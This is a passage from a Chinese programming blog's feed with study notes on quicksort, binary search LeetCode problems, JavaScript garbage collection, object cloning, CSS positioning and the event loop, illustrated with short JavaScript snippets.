        <content type="html"><![CDATA[<p>一直学，一直忘。希望这此能记牢。。</p><a id="more"></a><h1 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h1><h2 id="递归版"><a href="#递归版" class="headerlink" title="递归版"></a>递归版</h2><p>分两个函数。</p><p>一个函数用来进行分区。<br><img src="/images/post-images/1626182880904.png" alt=""></p><p>当递归到区间只有一个元素时，就可以视作排序完成而返回了。此时 p 两边的数组区间就排好序了。<br><img src="/images/post-images/1626182792717.png" alt=""></p><p>另一个函数被递归调用，以对分区进行排序。<br><img src="/images/post-images/1626183064779.gif" alt=""></p><p>分区函数中，哨兵元素可以随机取 <code>[l,r]</code> 内的值。取区间最右的值比较方便。<br>可以理解为分为四个区间：<br><img src="/images/post-images/1626183975710.png" alt=""></p><p>上图中，<code>[left, i)</code> 为小于哨兵的元素，图中为蓝色区间。<code>[i,j}</code> 为大于哨兵的元素，红色区间。<code>[j,r)</code> 为待比较元素，灰色区间。哨兵自己构成一个区间。</p><ul><li>当前比较的元素小于哨兵时，交换当前比较的元素与 <code>i</code> 指向的元素，并且 <code>i</code>，<code>j</code>，都加 1。</li><li>当前比较的元素大于哨兵时，只需 <code>j</code> 加 1 即可。</li></ul><p>JavaScript 完整代码：</p><pre><code>function quickSort(arr, l, r) {    if (r &lt;= l) {        return    }    let q = partition(arr, l, r);    console.log(q);    quickSort(arr, l, q - 1);    quickSort(arr, q + 1, r);}function partition(arr, l, r) {    let p = r;  // 可以随机选取 [l,r] 内的值, 这里选取最右作为哨兵索引    // 将哨兵放到最右边, 便于排序.    // 由于这里选取的是 r, 所以不用交换了    // [arr[p], arr[r]] = [arr[r], arr[p]];    let i = l;    for (let j = l; j &lt;= r - 1;) {        if (arr[j] &lt;= arr[r]) {            [arr[i], arr[j]] = [arr[j], arr[i]];            i += 1;        }         j += 1;    }    // 交换哨兵和比哨兵大的元素, 此时哨兵的位置就是最终位置了    [arr[i], arr[r]] = [arr[r], arr[i]];    return i;}</code></pre><p>递归版的参考视频，图片来源：<br><a href="https://www.bilibili.com/video/BV1rV411j7f6" target="_blank" rel="noopener">五点七边</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>查找</title>
      <link href="2021/07/12/cha-zhao/"/>
      <url>2021/07/12/cha-zhao/</url>
      
        <content type="html"><![CDATA[<p>找出一个数，这个数需要去按照某种规则查找。</p><a id="more"></a><h1 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h1><p>尤其常用来在递增或递减区间中搜索目标值。</p><p>2021-7-13 补充 - 开始：<br>讲解视频：<a href="https://www.bilibili.com/video/BV1d54y1q7k7" target="_blank" rel="noopener">五点七边</a><br>新的角度：<br>视频中，二分查找的目的就是，找出蓝红边界出来：<br><img src="/images/post-images/1626178992983.png" alt=""><br>求出的未知数 k or k-1 就是解。<br>需要注意，视频的算法与晚上流传的代码不同：</p><ol><li>两侧的指针是从 <code>数组之外</code> 的地方作为初始值，向内移动的。<br><img src="/images/post-images/1626179230225.png" alt=""></li><li>修改 left 与 right 时，都是直接赋值为 m。</li><li>返回值根据实际情况设置为 left 或者 right。</li></ol><p>伪代码：<br><img src="/images/post-images/1626179331019.png" alt=""><br>查找流程动图（动图有点大）：<br><img src="/images/post-images/1626179616183.gif" alt=""></p><p>问 1：<br>为什么不初始化 left 为数组第一个值 0 或者 right 初始化为 N-1 呢？<br>答：考虑数组全是红色的情况，如果全为红色，left 指向的是蓝色元素，这就矛盾了。right 同理。<br>问 2：<br>中间的 mid 值是否始终在 <code>[0,N)</code> 内取值？<br>答：YES。看图<br><img src="/images/post-images/1626179940434.png" alt=""><br>问 3：<br>更新 left 或者 right 时，能不能写成 <code>mid=left+1</code>or<code>mid=right-1</code>?<br>答：可以但没必要。不容易理解并且容易犯错。当 mid 正好在边界时，不好理解怎么 left 或者 righ 更新。<br><img src="/images/post-images/1626180182746.png" alt=""><br>问 4：<br>程序会死循环吗？<br>答：不会。首先，left + 1 === right 时，退出循环。<br>left + 2 === right 时，left 或者 right 更新后变为 left + 1 === right。<br>left+3 === right 时，left 或者 right 更新后变为 left + 2 === right。<br>以此类推<br><img src="/images/post-images/1626180481853.png" alt=""></p><p>总结：二分的一般流程。<br><img src="/images/post-images/1626180642667.png" alt=""></p><p>2021-7-13 补充 - 结束</p><p>在最简单的形式中，二分查找对具有指定左索引和右索引的连续序列进行操作。我们也称之为查找空间。二分查找维护查找空间的左、右和中间指示符，并比较查找目标；如果条件不满足或值不相等，则清除目标不可能存在的那一半，并在剩下的一半上继续查找，直到成功为止。<br>当然，一般题目不太可能给你一个如此现成的题型，让你上手就可以使用二分，所以我们需要思考如何构造一个成功的二分查找：</p><ul><li>预处理过程（大部分场景就是对未排序的集合进行排序）</li><li>二分查找过程（找到合适的循环条件，每一次将查找空间一分为二）</li><li>后处理过程（在剩余的空间中，找到合适的目标值）</li></ul><p>实现二分查找解决题目时注意：</p><ul><li>初始条件</li><li>终止</li><li>向左查找</li><li>向右查找</li></ul><p>二分查找的题目，基本逃不出三种：找特定值，找大于特定值的元素（上界），找小于特定值的元素（下<br>界）。而根据这三种，代码又最终会转化为以下这些问题：</p><ul><li>low，high 要初始化为 0、n-1 还是 0、n 又或者是 1，n？</li><li>循环的判定条件是 <code>low&lt;high</code> 还是 <code>low &lt;= high</code>?</li><li>if 的判定条件应该怎么写？</li><li>if 条件正确时，应该移动哪边的边界？</li><li>更新 low 和 high 时，mid 如何处理？</li></ul><h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><p><a href="https://leetcode.com/problems/koko-eating-bananas/" target="_blank" rel="noopener">leetcode 875</a></p><blockquote><p>这里总共有 N 堆香蕉，第 i 堆中有 piles[i] 根香蕉。警卫已经离开了，将在 H 小时后回来。 阿珂可以决定她吃香蕉的速度 K （单位：根 / 小时），每个小时，她将会选择一堆香蕉，从中吃掉 K 根。如果这堆香蕉少于 K 根，她将吃掉这堆的所有香蕉，然后这一小时内不会再吃更多的香蕉。珂珂喜欢慢慢吃，但仍然想在警卫回来前吃掉所有的香蕉。返回她可以在 H 小时内吃掉所有香蕉的最小<br>速度 K（K 为整数）。</p></blockquote><p>示例：</p><blockquote><p>输入: piles = [3,6,7,11], H = 8<br>输出: 4<br>输入: piles = [30,11,23,4,20], H = 5<br>输出: 30<br>输入: piles = [30,11,23,4,20], H = 6<br>输出: 23</p></blockquote><p>解答：化为二分查找问题。初始时，下边界就是每次吃一个，上边界就是每次吃数组最大值。要求的 k 就是每次吃 k 个，每次吃 k 个需要的小时数大于等于 h（因为 k 可能不是整数，但是题目显然要求整数，所以说解是大于等于 h 的）。</p><p><img src="/images/post-images/1626095717215.png" alt=""></p><p>Javascript 代码为：</p><pre><code>function eatBan(arr, h) {    function canEat(k) {        let sumH = 0;        for (let i = 0; i &lt; arr.length; i++) {            if (arr[i] % k === 0) {                sumH += arr[i] / k;            } else {                sumH += Math.ceil(arr[i] / k);            }        }        return sumH &gt; h;    }    let left = 1;  // 存在一种可能, 立马吃完: arr=[5], h=4    let right = Math.max(...arr);    // 版本一 while    while (left &lt; right) {        mid = Math.floor(left + (right - left) / 2);        if (canEat(mid)) {  // 全吃了需要的时间 sumH 大于警卫休息时间 h, 即吃不完, 所以每次要多吃点, 增加最小值            left = mid + 1;  // left 时可以取到与 right 相等的值的        } else {  // 需要的时间小于警卫休息时间, 慢慢吃, 缩减最大值            right = mid;  // 因为最后解出的 sumH 会大于等于 h, 所以这里不要 mid-1 !!!        }    }    // 版本二 while    while (left &lt;= right) {        mid = Math.floor(left + (right - left) / 2);        if (canEat(mid)) {              left = mid + 1;        } else {              right = mid - 1;        }}    // 两个版本都是返回 left    return left;}</code></pre><p>代码解释就看注释。</p><p>假如我们的阿珂就是笨笨的，将 low 初始化成了 0，high 变为 <code>max(...arr) + 1</code>，此时的循环条件应该如何写?</p><p>参考 b 站那个五点七边 up 的视频</p><h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><p><a href="https://leetcode.com/problems/sqrtx/" target="_blank" rel="noopener">leetcode 69</a></p><blockquote><p>给定一个非负整数 x，计算并返回 x 的平方根。<br>由于返回类型是整数，所以小数位被截断，只返回结果的整数部分。<br>注意：不允许使用任何内置指数函数或运算符。</p></blockquote><p>解答：很明显可以直接使用二分。不能用内置指数函数，乘法是可以用的。<br>不过要注意，由于是正整数，所以当 x 大于 1 时，sqrt(x) 取整后必定小于等于 <code>x/2</code>。故，若将上边界设为 <code>x/2</code>，对 1 和 0 进行特判即可。<br>JS 代码如下：</p><pre><code>// 把 mid*mid === x 与 mid*mid &lt; x 融合function mySqrt2(x) {    if (x === 1) {        return x;    }    let left = 2;    let right = Math.floor(x / 2);    // 版本一的 while，上取整    while (left &lt; right) {        let mid =  Math.ceil(left + (right - left) / 2);        if (mid * mid &gt; x) {            right = mid - 1;        } else {            left = mid;        }    }    // 版本二的 while，下取整    while (left &lt;= right) {        let mid = Math.floor(left + (right - left) / 2);        if (mid * mid &gt; x) {            right = mid - 1;        } else {            left = mid + 1;        }    }    // 两种版本都是返回 while    return right;  // 为什么是 right?}</code></pre><p>代码需要注意的地方：</p><ol><li><p>代码二的 left 是需要搭配 <code>left&lt;=right</code>，这也导致也进一步扩大了搜索空间。有些数，代码二要比代码一多计算一次。</p></li><li><p>出循环时，代码二的 right 永远是比 left 小 1 的。代码一则情况不一。</p></li><li><p>为什么返回值是 right? 就版本一来说：因为 <code>mid+1</code> 和 <code>mid-1</code> 中，若有满足条件的值，则只有可能是 mid-1.<br>答：</p><ul><li><p><code>mid * mid &lt; x</code>，假设 x 是 10，mid 是 3，解是 3，但是 <code>mid * mid &lt; x</code>，所以 <code>left = mid + 1</code> 后，left 就不是解了。</p></li><li><p><code>mid * mid &gt; x</code>，假设 x 是 10，mid 是 4，解是 3，但是 <code>mid * mid &gt; x</code>，所以 mid 变为 3，就是解。</p><p>我们通过不停的缩小搜索空间，最终 left 就变成我们要找的 mid 值，所以直接返回 left 就可以了。</p></li></ul></li></ol><h2 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h2><p><a href="https://leetcode.com/problems/first-bad-version/" target="_blank" rel="noopener">leetcode 278</a></p><blockquote><p>第一个错误的版本<br>假设你有 n 个版本 <code>[1, 2, ..., n]</code>，你想找出导致之后所有版本出错的第一个错误的版本。<br>题目给定 <code>isBadVersion(version)</code> 接口来判断版本号 version 是否在单元测试中出错。实现一个函数来查找第一个错误的版本。尽量减少对调用 API 的次数。</p></blockquote><p>解答：没啥好解释的。就是把比较大小直接变为了比较布尔值。。。</p><pre><code>var solution = function(isBadVersion) {    /**     * @param {integer} n Total versions     * @return {integer} The first bad version     */     return function(n) {        let left = 1;        let right = n;        while (left &lt; right) {            let mid = left + Math.floor((right - left) / 2);            if (isBadVersion(mid)) {                right = mid;            } else {                left = mid+1;            }        }        console.log(left, right)        return left;    };};</code></pre><h2 id="题目四"><a href="#题目四" class="headerlink" title="题目四"></a>题目四</h2><p>剑指 Offer 的面试题三的题目二：<br>题目描述：</p><blockquote><ul><li>在长度为 1+n 的数组里，所有数字元素大小为 [1,n]，显然包含至少一个重复的数字。找出其中任一重复的数字。注意，不能修改输入的数组</li></ul></blockquote><p>使用额外数组的解法就不说了，因为不是二分思想。<br>二分思想的解法：<br>看看这个 1-n 这 n 个数字，对着 n 个有序数字进行二分，每次都对一个区间内的数字到输入数组中计数。例如，若 1-k 这连续的 k 个数字在输入数组中出现的次数大于 k 次，说明，1-k 内又重复数字，可以缩小范围继续搜索。</p><pre><code>function findDuplicate(arr) {    function counts(left, right) {        let count = 0;        for (let e of arr) {            if (e &gt;= left &amp;&amp; e &lt;= right) {                count += 1;            }        }        return count;    }    let left = 1    let right = arr.length - 1;    // 从 left 到 right 是有序的    while (left &lt;= right) {        let mid = left + Math.floor((right - left) / 2)        let count = counts(left, mid)        if (left === right) {            if (count &gt; 1) {                return left;            } else {                return -1            }        }        if (count &gt; (mid + 1 - left)) {            right = mid;        } else {            left = mid + 1;        }    }}</code></pre><p>按照 B 站视频的解法模板，代码显得又比较复杂了：</p><pre><code>function findDuplicate(arr) {    function counts(left, right) {        let count = 0;        for (let e of arr) {            if (e &gt;= left &amp;&amp; e &lt;= right) {                count += 1;            }        }        return count;    }    let left = 1;      let right = arr.length - 1;      // 从 left 到 right 是有序的    while (left + 1 !== right) {        let mid = left + Math.floor((right - left) / 2)        let count = counts(left, mid)        if (count &gt; (mid - left) + 1) {            right = mid;        } else {            left = mid;        }    }    // 确定返回 left 还是 right    if (counts(left, left) &gt; 1) {        return left    } else if (counts(right, right) &gt; 1) {        return right;    } else {        return -1;    }}</code></pre><ol><li>建模，红色区域和蓝色区域的意义：蓝色指针及其左边区域无重复数字；红色指针及其右边区域无重复数字。并确定用来判断的函数 <code>counts</code><br><img src="/images/post-images/1626852387545.png" alt=""></li><li>套用模板<br><img src="/images/post-images/1626852595463.png" alt=""></li><li>确定返回 left 还是 right</li></ol><h2 id="总结二分查找"><a href="#总结二分查找" class="headerlink" title="总结二分查找"></a>总结二分查找</h2><p>大家一定要明确 mid 的真正含义有两层</p><ol><li>我们通过 mid 值来收敛搜索空间。如题一</li><li>题目最后的 mid 值（或者说 left，right）就是我们要找的目标值。如题二</li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>和小浩学算法. pdf</li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>垃圾回收 - Object 基础</title>
      <link href="2021/07/12/js-la-ji-hui-shou/"/>
      <url>2021/07/12/js-la-ji-hui-shou/</url>
      
        <content type="html"><![CDATA[<p>JavaScript 的内存管理是自动的、无形的。</p><a id="more"></a><h1 id="可达性"><a href="#可达性" class="headerlink" title="可达性"></a>可达性</h1><p>“可达” 的值是那些以某种方式可访问或可用的值。它们一定是存储在内存中的。</p><ol><li>** 确定可达的值 **：</li></ol><ul><li>当前执行函数的局部变量和参数。</li><li>嵌套调用时，调用栈上的所有函数的变量与参数。</li><li>全局变量</li><li>其他？<br>以上值称为 <code>roots</code>。</li></ul><ol start="2"><li>如果一个值可以从 <code>roots</code> 开始沿着引用链访问到，则认为此值是可达的。比方说，如果全局变量中有一个对象，并且该对象有一个属性引用了另一个对象，则 该 对象被认为是可达的。而且它引用的内容也是可达的。</li></ol><h1 id="一个简单例子"><a href="#一个简单例子" class="headerlink" title="一个简单例子"></a>一个简单例子</h1><pre><code>// user 具有对这个对象的引用let user = {    name: &quot;John&quot;};</code></pre><p><img src="/images/post-images/1626081894777.png" alt=""></p><p>如果 user 的值被重写了，这个引用就没了：</p><pre><code>user = null;</code></pre><p><img src="/images/post-images/1626081999991.png" alt=""></p><p>user 原本指向的 Object 对象实例变成不可达的了。因为没有引用了，就不能访问到它了。垃圾回收器会认为它是垃圾数据并进行回收，然后释放内存。<br>所以，当对象没有没任何引用指向时，就会被回收。</p><h1 id="相互引用"><a href="#相互引用" class="headerlink" title="相互引用"></a>相互引用</h1><p>运行以下代码：</p><pre><code>function marry(man, woman) {    woman.husband = man;    man.wife = woman;    return {        father: man,        mother: woman    }}let family = marry({    name: &quot;John&quot;}, {    name: &quot;Ann&quot;});</code></pre><p>产生的内存结构：<br><img src="/images/post-images/1626229256599.png" alt=""></p><p>当多个引用相互引用时，删除一个引用可能不会造成对象不可达。<br>同时删除 father 与 husban 这两个引用会导致对象 John 被删除。<br>如下图：<br><img src="/images/post-images/1626229565553.png" alt=""><br>因为对外引用不重要，只有传入引用才可以让对象是可达的。所以，John 现在是不可达的，并且将被从内存中删除，同时 John 的所有数据也将变得不可达。<br>进过垃圾回收后：<br><img src="/images/post-images/1626229544243.png" alt=""></p><h1 id="孤岛内存"><a href="#孤岛内存" class="headerlink" title="孤岛内存"></a>孤岛内存</h1><p>几个对象相互引用，但是没有外部引用指向他们中的任意一个。这些相互引用的对象是不可达的，将会被从内存中删除。<br>还是上面的代码，如果运行：</p><pre><code>family = null;</code></pre><p>内存状态变成：<br><img src="/images/post-images/1626245355581.png" alt=""><br>John 和 Ann 仍然连着，都有传入的引用。但是，前面说的 “family” 对象已经不再与根相连，没有了外部对这三个对象的引用，所以它变成了一座 “孤岛”，并且将被从内存中删除。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要需要掌握的内容：</p><ul><li>垃圾回收是自动完成的，我们不能强制执行或是阻止执行。</li><li>当对象是可达状态时，它一定是存在于内存中的。</li><li>被引用与可访问（从一个根）不同：一组相互连接的对象可能整体都不可达。</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://zh.javascript.info/" target="_blank" rel="noopener">https://zh.javascript.info/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS 对象克隆</title>
      <link href="2021/07/12/js-dui-xiang-ke-long/"/>
      <url>2021/07/12/js-dui-xiang-ke-long/</url>
      
        <content type="html"><![CDATA[<p>JS 没有内置直接一个克隆的 API，怎么办呢？</p><a id="more"></a><h1 id="Object-assign"><a href="#Object-assign" class="headerlink" title="Object.assign"></a>Object.assign</h1><p>只能算 “浅复制”，因为对于引用类型，它只是以引用形式被拷贝，导致 clone 后的对象里的引用与被克隆中的引用都指向同一个对象。一次需要额外的检查进行引用类型额的赋值。</p><pre><code>let x = { age: 99, friends: [1, 2, 3] };let clone = Object.assign({}, x);console.log(clone.friends === x.friends);  // true</code></pre><h1 id="JSON-stringify"><a href="#JSON-stringify" class="headerlink" title="JSON.stringify"></a>JSON.stringify</h1><p>受限于 stringify 本身的限制，一些不能在 JSON 里表示的值会被抹去。。。</p><ul><li>如果对象的属性是 <code>undefined</code>、<code>函数</code> 或 <code>XML 对象</code>，该属性会被 <code>JSON.stringify()</code> 过滤。对象属性会被直接删除掉。<br><img src="/images/post-images/1626081022916.png" alt=""></li></ul><h1 id="第三方库"><a href="#第三方库" class="headerlink" title="第三方库"></a>第三方库</h1><p>例如 lodash 的 <a href="https://lodash.com/docs/4.17.15#cloneDeep" target="_blank" rel="noopener">cloneDeep</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>现代 JavaScript 教程</li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绝对定位</title>
      <link href="2021/07/12/jue-dui-ding-wei/"/>
      <url>2021/07/12/jue-dui-ding-wei/</url>
      
        <content type="html"><![CDATA[<p>绝对定位是相对非 static 的包含块去定位。</p><a id="more"></a><h1 id="水平方向"><a href="#水平方向" class="headerlink" title="水平方向"></a>水平方向</h1><p>开启绝对定位后，在水平方向上，不仅有之前 <a href="/images/post/wei-shi-me-marginauto-ke-yi-shui-ping-ju-zhong/">盒子模型水平居中</a> 提到的 7 个属性，还有 position 的 left 和 right 属性。就是说等式左边变成了九个项，等式的规则还是一样的。<br>left 和 right 属性可以设置为 auto，并且 auto 就是默认值，所以等式不满足时，浏览器会自动调整这两个值 。<br>实现水平居中：<br><img src="/images/post-images/1626075393539.png" alt=""><br>如上图所示，实现水平居中效果，浏览器自动调整了 margin<br><img src="/images/post-images/1626075541925.png" alt=""><br>如上图所示，过渡约束时，浏览器自动调整了 with 使得等式成立！</p><h1 id="垂直方向"><a href="#垂直方向" class="headerlink" title="垂直方向"></a>垂直方向</h1><p>与水平方向类似。这一点是盒子模型所没有的。</p><pre><code>top + margin-top/bottom + padding-top/bottom + border-top/bottem = 包含块 height</code></pre><p>实现垂直居中：<br><img src="/images/post-images/1626077187318.png" alt=""></p><p>怎么实现水平 + 垂直同时居中不用我多说了吧。</p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>定位</title>
      <link href="2021/07/11/ding-wei/"/>
      <url>2021/07/11/ding-wei/</url>
      
        <content type="html"><![CDATA[<p>position</p><a id="more"></a><h1 id="相关属性"><a href="#相关属性" class="headerlink" title="相关属性"></a>相关属性</h1><ul><li>top</li><li>bottom</li><li>left</li><li>right</li></ul><p>top 和 bottom 垂直，left 和 right 水平，通常垂直或者水平只设置一个。<br>负值向相反方向移动。</p><h1 id="相对定位-relative"><a href="#相对定位-relative" class="headerlink" title="相对定位 - relative"></a>相对定位 - relative</h1><p>当 position 属性的值设成 relative 时开启相对定位。<br>相对定位是相对元素原来的位置进行位移。而非父元素，HTML 元素。</p><p>移动规则：元素的每一个像素相对元素原来的位置进行移动。</p><h2 id="相对定位的特点"><a href="#相对定位的特点" class="headerlink" title="相对定位的特点"></a>相对定位的特点</h2><ul><li><p>相对定位会为元素保留原来的位置，就像 “灵魂出窍” 一样。</p></li><li><p>不会脱离文档流，当然也不会改变元素的性质。<br><img src="/images/post-images/1626004396518.png" alt=""><br>如上图所示，行内元素 span 和块元素 div** 都设置 ** 了宽高，在设置相对后，都没有发生改变！</p></li><li><p>相对定位的元素层级高于文档流元素。<br><img src="/images/post-images/1626005099322.png" alt=""><br>如上图所示，行内元素 span 设置了相对定位，间接把 static 定位元素的 div 作为了背景。</p></li></ul><h1 id="绝对定位-实际用的最多-absolute"><a href="#绝对定位-实际用的最多-absolute" class="headerlink" title="绝对定位(实际用的最多)-absolute"></a>绝对定位(实际用的最多)-absolute</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li><p>脱离文档流，因此元素性质发生改变<br><img src="/images/post-images/1626007412556.png" alt=""><br>如上图所示，行内元素 span** 可以设置 ** 宽高！</p></li><li><p>提升层级，这一点同相对定位，由于不保留原来的位置，所以同相对定位看起来不一样了。</p></li><li><p>定位方式比较特殊。相对于包含块（containing block）进行定位。</p><ul><li>绝对定位的包含块是指距离本元素最近的，非 static 定位的 ** 块 ** 元素。若没有，则指定 html 作为包含块。<br><img src="/images/post-images/1626008241967.png" alt=""><br>如上图所示，span 没有选择最直接的祖先元素，而是选择了最外层的 html 元素。</li></ul></li></ul><h1 id="固定定位-fixed"><a href="#固定定位-fixed" class="headerlink" title="固定定位 - fixed"></a>固定定位 - fixed</h1><p>特点与绝对定位一致。<br>但是，定位方式不同于绝对定位，固定定位的是相对于视口进行定位。视口就是你当前可以通过滚动看到的页面，视口大小取决于窗口大小。</p><blockquote><p>视口 (viewport) 代表当前可见的计算机图形区域。 在 Web 浏览器术语中，通常与浏览器窗口相同，但不包括浏览器的 UI， 菜单栏等——即指你正在浏览的文档的那一部分。—MDN</p></blockquote><p><img src="/images/post-images/1626055261245.gif" alt=""></p><h1 id="粘滞定位-sticky"><a href="#粘滞定位-sticky" class="headerlink" title="粘滞定位 - sticky"></a>粘滞定位 - sticky</h1><p>相对定位与固定定位组合的方式。<br>未满足粘滞的要求时，是相对定位状态，保留元素位置。满足粘滞条件后，会脱离文档流，就像固定定位了。</p><pre><code>.nav-bar {    position: sticky;    top: 5px;    height: 48px;    width: 1200px;    margin: 50px auto;}</code></pre><p><img src="/images/post-images/1626058114992.gif" alt=""></p><p>由于不兼容所有的 IE 浏览器，所以多用 JS 实现粘滞效果</p>]]></content>
      
      
      <categories>
          
          <category> 日常编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript 事件循环</title>
      <link href="2021/07/09/javascript-shi-jian-xun-huan/"/>
      <url>2021/07/09/javascript-shi-jian-xun-huan/</url>
      
        <content type="html"><![CDATA[<p>听说事件循环是面试必问的哦。</p><a id="more"></a><h1 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h1><p><a href="http://latentflip.com/loupe" target="_blank" rel="noopener">Loupe</a></p><p><img src="/images/post-images/1625830568267.png" alt=""></p><h1 id="JS-单线程，非阻塞"><a href="#JS-单线程，非阻塞" class="headerlink" title="JS 单线程，非阻塞"></a>JS 单线程，非阻塞</h1><p>JavaScript 的主要用途是与用户互动，以及操作 DOM。<br>JS 所执行代码的线程称作 ** 主线程 **<br>多线程会使操作复杂起来，比如有两个线程同时操作 DOM，一个线程删除了当前的 DOM 节点，一个线程是要操作当前的 DOM 阶段，最后以哪个线程的操作为准？<br>** 所以 JS 是单线程的。**</p><p>非阻塞就是通过事件循环实现的。</p><h1 id="任务（事件）队列"><a href="#任务（事件）队列" class="headerlink" title="任务（事件）队列"></a>任务（事件）队列</h1><p>任务（事件）队列可以视作异步任务的缓冲区。</p><p>异步任务一般包含 IO 设备，键盘，网络 IO 等非 CPU 操作，异步任务直接被放到 “任务队列” 中，只有 “任务队列” 通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。<br>异步的具体机制如下：</p><ol><li>所有同步任务在主线程上执行，构成一个“执行栈（execution context stack）”</li><li>主线程外，存在一个“任务队列（task queue）”。存放异步事件。</li><li>一旦 “执行栈” 中的所有同步任务执行完毕，系统就会读取 “任务队列”，看看里面有哪些事件。某些异步任务就会进入执行栈来执行。</li></ol><p>只要主线程空了，就会去读取 “任务队列”，这就是 JavaScript 的运行机制。这个过程会不断重复。</p><p>异步任务必须指定回调函数，当主线程开始执行异步任务，就是执行对应的回调函数。</p><p>“任务队列” 是一个先进先出的数据结构，排在前面的事件，优先被主线程读取。主线程的读取过程基本上是自动的，只要执行栈一清空，”任务队列” 上第一位的事件就自动进入主线程。</p><h1 id="浏览器的事件循环"><a href="#浏览器的事件循环" class="headerlink" title="浏览器的事件循环"></a>浏览器的事件循环</h1><h2 id="执行栈和事件队列"><a href="#执行栈和事件队列" class="headerlink" title="执行栈和事件队列"></a>执行栈和事件队列</h2><p><img src="/images/post-images/1625829447986.png" alt=""></p><p>上图中，主线程运行的时候，产生堆（heap）和栈（stack），栈中的代码调用各种外部 API，它们在 “任务队列” 中加入各种事件（click，load，done）。只要栈中的代码执行完毕，主线程就会去读取 “任务队列”，依次执行那些事件所对应的回调函数。</p><h3 id="执行栈"><a href="#执行栈" class="headerlink" title="执行栈"></a>执行栈</h3><p>同步代码的执行，按照顺序添加到执行栈中</p><pre><code>function a() {    b();    console.log(&#39;a&#39;);}function b() {    console.log(&#39;b&#39;)}a();</code></pre><p>可视化工具结果：<br><img src="/images/post-images/1625830246807.gif" alt=""></p><ol><li>执行函数 <code>a()</code> 先入栈</li><li><code>a()</code> 中先执行函数 <code>b()</code> 函数 <code>b()</code> 入栈</li><li>执行函数 <code>b()</code>, <code>console.log(&#39;b&#39;)</code> 入栈</li><li>输出 <code>b</code>， <code>console.log(&#39;b&#39;)</code> 出栈</li><li>函数 <code>b()</code> 执行完成，出栈</li><li><code>console.log(&#39;a&#39;)</code> 入栈，执行，输出 <code>a</code>, 出栈</li><li>函数 <code>a</code> 执行完成，出栈。</li></ol><h3 id="事件队列"><a href="#事件队列" class="headerlink" title="事件队列"></a>事件队列</h3><p>异步代码的启动后，异步代码会被挂起，继续执行执行栈其他代码。<br>就算当异步事件返回结果，并不会立刻执行回调函数（如果有回调的话），而是会被放入事件队列，只有当目前的执行栈中所有任务代码执行完，主线程才回去查找并执行事件队列中的任务。取出第一位的事件，将其回调放入执行栈执行。。。如下图：</p><p><img src="/images/post-images/1625831490118.png" alt=""></p><p>在上面同步代码的基础上添加异步事件：</p><pre><code>function a() {    b();    console.log(&#39;a&#39;);}function b() {    console.log(&#39;b&#39;)    setTimeout(function() {        console.log(&#39;c&#39;);    }, 2000)}a();</code></pre><p><img src="/images/post-images/1625832237286.gif" alt=""></p><p>上图中，Web Apis 框框内，绿色圈圈转了 2s，就是 <code>setTimeout</code> 参数的 2000ms，由于之后还有同步代码，所以 <code>setTimeout</code> 的回调函数并没有在 2000ms 后立即执行。</p><p>再加上点击事件看一下：</p><pre><code>$.on(&#39;button&#39;, &#39;click&#39;, function onClick() {    setTimeout(function timer() {        console.log(&#39;You clicked the button!&#39;);        }, 2000);});console.log(&quot;Hi!&quot;);setTimeout(function timeout() {    console.log(&quot;Click the button!&quot;);}, 5000);console.log(&quot;Welcome to loupe.&quot;);</code></pre><p><img src="/images/post-images/1625836672649.gif" alt=""></p><p>总结一下：</p><p><img src="/images/post-images/1625832509592.png" alt=""></p><h2 id="宏任务和微任务"><a href="#宏任务和微任务" class="headerlink" title="宏任务和微任务"></a>宏任务和微任务</h2><p>不同的异步任务可被再次分为：宏任务和微任务，只能属于其中一种。</p><p>宏任务：</p><ul><li>script(整体代码)</li><li>setTimeout()</li><li>setInterval()</li><li>postMessage</li><li>I/O</li><li>UI 交互，渲染</li><li>XHR 回调</li></ul><p>微任务:</p><ul><li>new Promise().then()，catch()，基于的 promise 如 fetch</li><li><code>MutationObserver</code>(html5 新特性)</li><li><code>Object.observe</code>（已废弃；被 ES6 的 <code>Proxy</code> 替代）</li></ul><p>微任务存在的必要性：<br>** 更好地控制任务优先级 **<br>页面渲染事件，各种 IO 的完成事件等随时被添加到任务队列中，一直会保持先进先出的原则执行，我们不能准确地控制这些事件被添加到任务队列中的位置。但是这个时候突然有高优先级的任务需要尽快执行，那么一种类型的任务就不合适了，所以引入了微任务队列。</p><h2 id="两种异步任务的运行机制"><a href="#两种异步任务的运行机制" class="headerlink" 